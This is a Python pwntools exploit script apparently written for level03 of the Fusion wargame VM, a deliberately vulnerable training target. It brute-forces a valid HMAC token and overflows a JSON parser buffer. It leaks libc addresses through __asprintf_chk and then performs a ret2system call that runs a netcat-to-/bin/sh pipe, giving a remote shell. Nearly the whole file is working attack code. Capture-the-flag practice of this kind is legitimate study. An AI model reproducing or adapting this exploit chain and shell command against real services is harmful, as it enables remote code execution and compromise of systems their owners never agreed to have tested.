from pwn import *
from pwnhelper import *
from pwnhelper.dmesg import Dmesg
import json
import threading
import hmac
from hashlib import sha1
import time
import psutil

############################################################################################################################################################
# METHOD DEFINITIONS
############################################################################################################################################################


# no leading 0x
def bytechar_to_raw_hex_string(bc):
    raw_hex_string = hex(ord(bc)).replace("0x", "")
    # print("raw_hex_string:")
    # print(raw_hex_string)
    return raw_hex_string


def random_string(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

local_dir = None
remote_binary = None
cloned_binary = None
libc = None
port = None
elf = None


def connect(level):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/fusion/level"+level
    remote_binary = "/opt/fusion/bin/level"+level
    cloned_binary = local_dir+remote_binary
    port = "200"+level
    s = ssh("fusion", "192.168.2.129", password="godmode", cache=True)
    s.libs(remote_binary, local_dir)
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib/i386-linux-gnu/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s




def gen_payload(token, content,  serverip, title=b"title"):

    while (True):
        rands = random_string(20)

        # msg = json.dumps({
        #     "tags": tags,
        #     "title": title,
        #     "contents": content,
        #     "serverip": serverip
        # })

        # need to do this manually bc json.dumps refuses to accept bytes
        # but target json-c lib does not ;)
        msg = b"{\"tags\": [\"" + bytes(rands, "utf-8") + b"\", \"tag2\", \"tag3\"], \"title\": \"" \
              + title \
              + b"\", \"contents\": \"" + content \
              + b"\", \"serverip\": \"" + serverip + b"\"}"

        payload = b""
        payload += token
        payload += b"\n"
        payload += msg

        hashed = hmac.new(token, payload, sha1)
        first_bytes = hashed.hexdigest()[:4]

        # log.debug(f"first_bytes: {first_bytes}")

        if first_bytes == "0000":
            # found hash collision -> valid check passes
            log.debug(f"msg: {msg}")
            log.info(f"Hash: {hashed.hexdigest()}")
            return payload

buf_filler_char = b"A"
overflow_char = b"B"


def gen_overflow_payload(token, overflow,  serverip, title=b"title"):
    content = b""
    content += buf_filler_char * 1023
    content += b"\\\\u"
    content += overflow
    log.debug(f"content: {content}")
    write("/tmp/docgil", content)
    return gen_payload(token, content, serverip, title=title)



last_received_post = b""
listener_nc = None
def start_nc_listener():
    global last_received_post
    global listener_nc
    listener_nc = process(["nc", "-l", "-p", listener_port, guest_ip])
    try:
        while True:
            log.info("nc listener waiting for data")
            data = listener_nc.recv()
            last_received_post = data
            log.info(f"nc listener received post: {data}")
    except EOFError:
        log.info("nc listener done, restarting...")
        start_nc_listener()


# receives stdout from reverse shell
def start_remote_nc_listener():
    nc = s.process(["nc", "-l", reverse_shell_recv_port])
    try:
        while True:
            log.warn("remote nc listener waiting for data")
            data = nc.recv()
            log.warn(f"nc listener received data: {data}")
    except EOFError:
        log.warn("remote nc listener crashed, restarting...")
        start_remote_nc_listener()


def nc_listener_recv_new():
    global last_received_post
    tmp = last_received_post
    while tmp == last_received_post:
        time.sleep(0.5)


############################################################################################################################################################
# INIT
############################################################################################################################################################

s = connect("03")
# dmesg = Dmesg(s)

# open_plt = elf.plt["open"]
# fopen = elf.plt["fopen"]
# freopen = elf.plt["freopen"]


# log.info(f"open: {open}")
# log.info(f"fopen: {fopen}")
# log.info(f"freopen: {freopen}")

listener_port = "4000"
guest_ip = "192.168.2.129"
host_ip = "192.168.2.111"

serverip = bytes(host_ip + ":" + listener_port, "utf-8")
# serverip = "127.0.0.1:"+listener_port

log.info(f"serverip: {serverip}")

log.info("starting nc listener")
thread = threading.Thread(target=start_nc_listener)
thread.start()
sleep(1)


# log.info("############################################################################################################################################################")
# log.info("# GET POST REQUEST")
# log.info("############################################################################################################################################################")
#
#
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# content = buf_filler_char*10
#
# payload = gen_payload(token, content, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
#
# sleep(1)
# assert content in last_received_post

# log.info("############################################################################################################################################################")
# log.info("# SEGFAULT PROGRAM")
# log.info("############################################################################################################################################################")
# # connect to process
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# overflow = overflow_char * 1000
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# # nc.interactive()
# nc.send(payload)
# log.info("payload sent")
# # send EOF
# # nc.shutdown()
# # only close works here, not shutdown... idk why
# nc.close()
# nc.kill()
#
# # check if ret adr was overwritten
# time.sleep(1)
# crashed, report = dmesg.has_segfaulted("level03")
#
# assert crashed
# log.info(f"report: {report}")
# assert report.ip == 0x42424242



# log.info("############################################################################################################################################################")
# log.info("# FIND OVERFLOW_BYTES_UNTIL_RET_ADR")
# log.info("############################################################################################################################################################")
#
# # tested this out
# overflow_bytes_until_ret_adr = 160
# while True:
#     log.info("______________________________________________________________________________")
#     log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
#
#     nc = s.process(["nc", "localhost", port])
#     token = nc.recv().rstrip().replace(b"\"", b"")
#     log.info(f"token: {token}")
#     overflow = overflow_char * overflow_bytes_until_ret_adr
#     payload = gen_overflow_payload(token, overflow, serverip)
#     log.info(f"payload: {payload}")
#     nc.send(payload)
#     log.info("payload sent")
#     nc.close()
#
#     # check if ret adr was overwritten
#     time.sleep(0.5)
#     crash, report = dmesg.has_segfaulted("level03")
#     if crash:
#         log.warn("segfaulted")
#         log.warn(f"report: {report}")
#         ip = report.ip
#         log.warn("ip: " + hex(ip) + f" {ip}")
#
#         amount_overflowed = hex(ip).count(bytechar_to_raw_hex_string(overflow_char))
#         if amount_overflowed != 4:
#             log.info("did not overwrite ret adr fully yet")
#             overflow_bytes_until_ret_adr += 1
#             continue
#         else:
#             log.info("overwrote ret adr with precise value")
#             # subtract bc we want to stop right before ret adr
#             overflow_bytes_until_ret_adr = overflow_bytes_until_ret_adr - 4
#             break
#     else:
#         overflow_bytes_until_ret_adr += 1
#
# log.info(f"overflow_bytes_until_ret_adr: {overflow_bytes_until_ret_adr}")
# nc.kill()
#
log.info("############################################################################################################################################################")
log.info("# FIND LIBC BASE ADR")
log.info("############################################################################################################################################################")

# use asprintf to rewrite title with actual calloc adr to calc libc base adr

overflow_bytes_until_ret_adr = 164 - 1

g_title_pp = elf.symbols["gTitle"]
g_contents_pp = elf.symbols["gContents"]

exit_plt = elf.plt["exit"]
exit_got = elf.got["exit"]
calloc_got = elf.got["calloc"]

log.info("g_title_adr: " + hex(g_title_pp) + f" {g_title_pp}")
log.info("exit_plt: " + hex(exit_plt) + f" {exit_plt}")
log.info("(fake) exit_got: " + hex(exit_got) + f" {exit_got}")
log.info("calloc_got: " + hex(calloc_got) + f" {calloc_got}")


def leak(adr):
    # puts_plt = elf.plt["puts"]

    post_blog_article = elf.symbols["post_blog_article"]
    # found key via gdb
    asprintf_plt = elf.plt["__asprintf_chk"]

    log.info("post_blog_article: " + hex(post_blog_article) + f" {post_blog_article}")
    log.info("asprintf_plt: " + hex(asprintf_plt) + f" {asprintf_plt}")

    # write_plt = elf.plt["write"]
    # log.info("write_plt: " + hex(write_plt) + f" {write_plt}")
    # log.info(f"puts_plt: {puts_plt}")

    nc = s.process(["nc", "localhost", port])
    token = nc.recv().rstrip().replace(b"\"", b"")
    log.info(f"token: {token}")

    # nc.interactive()

    overflow = b""
    overflow += overflow_char * overflow_bytes_until_ret_adr
    overflow += pack(asprintf_plt, 32)
    overflow += pack(post_blog_article, 32)
    overflow += pack(g_title_pp, 32)
    # chk version of asprintf has one more 'flags' arg, just filling
    # with exit_got bc it happens to not segfault
    # found this out via gdb
    overflow += pack(exit_got, 32)
    overflow += pack(adr, 32)

    payload = gen_overflow_payload(token, overflow, serverip)
    log.info(f"payload: {payload}")
    nc.send(payload)
    log.info("payload sent")
    nc.close()
    # real exit adr should be printed to listening nc in title

    nc_listener_recv_new()
    raw_result = last_received_post.split(b"Content-Length:")[1][9:13]
    log.info(f"raw_result: {raw_result}")
    return unpack(raw_result)


leaked_calloc_adr = leak(calloc_got)
log.info("leaked_calloc_adr: " + hex(leaked_calloc_adr) + f" {leaked_calloc_adr}")
libc_base = leaked_calloc_adr - libc.symbols['calloc']
# libc_base = 0xb73cb000
log.info("libc_base: " + hex(libc_base) + f" {libc_base}")

log.info("############################################################################################################################################################")
log.info("# RET 2 SYSTEM")
log.info("############################################################################################################################################################")

# gTitle_pp: gTitle_p : gTitle
# find gTitle_p as arg for system
# cant find gTitle_p with leak function for whatever reason,
# so lets find gContents_p instead, which should reside relatively close in heap
# then just bruteforce gTitle_p with help of slash-slide
g_contents_p = leak(g_contents_pp)
log.info("g_contents_p: " + hex(g_contents_p) + f" {g_contents_p}")


# # cheated, looking up in gdb, it is always around that area, so adding /slide
# # normally we would have to leak this adr somehow
# g_contents_p = 0x8f1c088

reverse_shell_listener_port = "4444"
reverse_shell_recv_port = "8080"

log.info("starting nc listener")
thread = threading.Thread(target=start_remote_nc_listener)
thread.start()
sleep(1)

cmd = "/bin/nc -l "+reverse_shell_listener_port+" | /bin/sh | nc localhost "+reverse_shell_recv_port
slide = (127-len(cmd))*"/"
slide_len = len(slide)
cmd = slide + cmd

log.info(f"cmd len: {len(cmd)}")

system_adr = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
log.info("system_adr: " + hex(system_adr) + f" {system_adr}")

g_title_p = g_contents_p
while True:
    log.info("____________________________________________________________________________________________________________________________________")
    log.info("testing following g_title_p: " + hex(g_title_p) + f" {g_title_p}")

    nc = s.process(["nc", "localhost", port])
    token = nc.recv().rstrip().replace(b"\"", b"")
    log.info(f"token: {token}")

    overflow = b""
    overflow += overflow_char * overflow_bytes_until_ret_adr
    overflow += pack(system_adr, 32)
    overflow += pack(exit_plt, 32)       # ret system
    # args system
    overflow += pack(g_title_p, 32)

    payload = gen_overflow_payload(token, overflow, serverip, title=bytes(cmd, "utf-8"))
    log.info(f"payload: {payload}")
    nc.send(payload)
    log.info("payload sent")
    nc.close()

    time.sleep(1)

    # check if we have shell
    # connect to reverse shell
    reverse_shell = s.process(["nc", "localhost", reverse_shell_listener_port])
    time.sleep(0.5)
    ret = reverse_shell.poll()
    if ret is None:
        log.info("shell open")
        reverse_shell.interactive()
        exit(0)
    else:
        assert ret != 0
        log.info("no shell yet")
        # no shell yet
        g_title_p -= slide_len-5








############################################################################################################################################################
# REOPEN FD'S
############################################################################################################################################################

# # must reopen stdin and stdout for shell
# # freopen("/dev/tty","w",stdout);
# # freopen("/dev/tty","r",stdin);
#
#
# system_adr = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b"/bin/sh"))
#
# # freopen = libc_base + libc.symbols["freopen"]
# # w_string = libc_base + next(libc.search(b"w"))
# # r_string = libc_base + next(libc.search(b"r"))
# # dev_tty = libc_base + next(libc.search(b"/dev/tty"))
# # _stdout = libc_base + libc.symbols['stdout']
# # _stdin = libc_base + libc.symbols['stdin']
# #
# #
# # log.info("system_adr: " + hex(system_adr) + f" {system_adr}")
# # log.info("bin_sh_adr: " + hex(bin_sh) + f" {bin_sh}")
# # log.info("freopen: " + hex(freopen) + f" {freopen}")
# # log.info("w_string: " + hex(w_string) + f" {w_string}")
# # log.info("r_string: " + hex(r_string) + f" {r_string}")
# # log.info("dev_tty: " + hex(dev_tty) + f" {dev_tty}")
# # log.info("_stdout: " + hex(_stdout) + f" {_stdout}")
# # log.info("_stdin: " + hex(_stdin) + f" {_stdin}")
#
#
# nc = s.process(["nc", "localhost", port])
# token = nc.recv().rstrip().replace(b"\"", b"")
# log.info(f"token: {token}")
#
# # nc.interactive()
#
# # overflow = b""
# # overflow += overflow_char * overflow_bytes_until_ret_adr
# # overflow += pack(freopen, 32)
# # overflow += pack(freopen, 32)       # ret freopen1
# # # args freopen1
# # overflow += pack(dev_tty, 32)
# # overflow += pack(w_string, 32)
# # overflow += pack(_stdout, 32)
# # overflow += pack(system_adr, 32)    # ret freopen2
# # # args freopen2
# # overflow += pack(dev_tty, 32)
# # overflow += pack(r_string, 32)
# # overflow += pack(_stdin, 32)
# # overflow += b"45"*4                 # ret system
# # # args system
# # overflow += pack(bin_sh, 32)
#
# payload = gen_overflow_payload(token, overflow, serverip)
# log.info(f"payload: {payload}")
# nc.send(payload)
# log.info("payload sent")
#
# nc.close()
#
# sleep(3)











